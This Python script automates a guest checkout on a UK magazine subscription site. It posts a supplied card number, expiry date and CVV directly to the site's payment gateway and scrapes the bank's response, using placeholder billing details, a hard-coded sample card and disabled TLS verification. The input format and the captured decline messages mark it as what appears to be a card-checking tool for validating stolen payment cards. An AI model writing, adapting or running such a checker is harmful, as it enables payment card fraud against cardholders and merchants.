import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import httpx
import time
import base64
import random
import re

def capture(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

def clean_text(text):
    if not text:
        return "Unknown"
    return re.sub(r'\s+', ' ', text).strip()

async def test_ass_run(card_str):
    cc, month, year, cvv = [p.strip() for p in card_str.split('|')[:4]]
    if len(year) == 2:
        year = "20" + year
    month = month.zfill(2)

    headers_base = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=30.0) as session:
        print("[*] Step 1: Getting Product ID...")
        r = await session.get("https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm", headers=headers_base)
        pi = capture(r.text, "prodId=", "&amp")
        ps = capture(r.text, "prodSubId=", "&amp")
        print(f"    prodId={pi}, prodSubId={ps}")

        print("[*] Step 2: Adding to Cart...")
        head2 = {**headers_base, "Host": "www.isubscribe.co.uk", "referer": "https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm"}
        r2 = await session.get(f"https://www.isubscribe.co.uk/cart.cfm?action=add&prodId={pi}&prodSubId={ps}&qty=1", headers=head2)
        print(f"    Add Cart Status: {r2.status_code}")

        print("[*] Step 3: Setting Billing Address...")
        head3 = {
            **headers_base,
            "Host": "www.isubscribe.co.uk",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.isubscribe.co.uk",
            "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=bill&email=sachiopremiun%40gmail.com",
        }
        post3 = f"itemcount=1&guestcheckout=true&userid=&email=sachiopremiun%40gmail.com&title=Mr.&firstname=Sachio&lastname=YT&phone=19006318646&company=&street=1+Warwick+Road&suburb=Thames+Ditton&postcode=KT7+0PR&state=&otherstate=&country=United+Kingdom&prodsubid_1={ps}&prodtitle_1=She+Kicks+Magazine&emaildelivery_1=0&isdigital_1=0&isgiftvoucher_1=0&xmas_start_1=0&renewal_1=0&gift_1=0&senderfirstname_1=+&email_1=&message_1=&senddate_1=18%2F10%2F2023&address_1=billing&title_1=Mr.&firstname_1=Sachio&lastname_1=YT&company_1=&street_1=1+Warwick+Road&suburb_1=Thames+Ditton&postcode_1=KT7+0PR&state_1=United+Kingfonm&country_1=United+Kingdom&publisher_post=0&organisations_post=0&isubscribe_terms=1"
        r3 = await session.post("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setbilling&formmode=new&ajax=true", headers=head3, data=post3)
        print(f"    Set Billing Status: {r3.status_code}")

        print("[*] Step 4: Setting Payment Method...")
        if cc.startswith("3"):
            typec = "AMEX"
        elif cc.startswith("4"):
            typec = "VISA"
        else:
            typec = "Mastercard"

        head4 = {
            **headers_base,
            "Host": "www.isubscribe.co.uk",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=pay",
        }
        post4 = f"paymentMethod=creditcard&walletToken=&card={typec}"
        r4 = await session.post("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setpayment&formmode=new&ajax=true", headers=head4, data=post4)
        print(f"    Set Payment Status: {r4.status_code}")

        print("[*] Step 5: Getting Confirm Tokens...")
        head5 = {**headers_base, "Host": "www.isubscribe.co.uk", "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=pay"}
        r5 = await session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=confirm", headers=head5)
        r5_ = r5.text
        ft = capture(r5_, "fzToken = '", "'")
        ve = capture(r5_, '"verification" value="', '"')
        ref = capture(r5_, "reference: '", "'")
        print(f"    fzToken={ft[:15]}... | ve={ve[:15]}... | ref={ref}")

        print("[*] Step 6: Getting FatZebra SDK Bridge Token...")
        r6 = await session.get("https://paynow.pmnts.io/sdk/bridge")
        r6_ = r6.text
        cs = capture(r6_, "'X-CSRF-Token': \"", '"')
        xp = capture(r6_, 'xpid:"', '"')
        print(f"    CSRF={cs[:10]}... | xpid={xp}")

        print("[*] Step 7: Submitting Direct Gateway Payment to FatZebra (pmnts.io)...")
        head13 = {
            **headers_base,
            "Host": "gateway.pmnts.io",
            "origin": "https://www.isubscribe.co.uk",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://www.isubscribe.co.uk/",
        }
        post13 = f"return_path=https%3A%2F%2Fwww.isubscribe.co.uk%2Fssl%2Fcheckout%2Findex.cfm%3Fview%3Dnew%26step%3Dconfirm%26mode%3Dadmin%26action%3DplaceOrder%26source%3Dconfirm&verification={ve}&card_type={typec}&card_number={cc}&card_holder=Sachio+YT&expiry_month={month}&expiry_year={year}&cvv={cvv}"
        r13 = await session.post("https://gateway.pmnts.io/v2/credit_cards/direct/isubscribeunitedkingdom", headers=head13, data=post13)
        print(f"    Gateway Direct Status: {r13.status_code}")

        print("[*] Step 8: Reading Bank Order Confirmation...")
        head14 = {**headers_base, "Host": "www.isubscribe.co.uk", "referer": "https://www.isubscribe.co.uk/"}
        r14 = await session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=returning&step=confirm&formmode=edit&source=confirm&error=true&errorno=05", headers=head14)
        print(f"    Confirmation Page Status: {r14.status_code}")
        msg1 = capture(r14.text, '<div class="alert alert-danger alert-dismissable" id="', '">')
        msg2 = capture(r14.text, f'<div class="alert alert-danger alert-dismissable" id="{msg1}">', "<br>") if msg1 else None
        msg = clean_text(msg2) if msg2 else "No alert found"
        print(f"    Bank Result Message: {msg}")

if __name__ == '__main__':
    test_c = sys.argv[1] if len(sys.argv) > 1 else '4033060047342909|08|28|667'
    print(f"=== TESTING ASS.PY (FATZEBRA/ISUBSCRIBE) ON {test_c} ===")
    start = time.time()
    asyncio.run(test_ass_run(test_c))
    print(f"Elapsed: {round(time.time() - start, 2)}s")
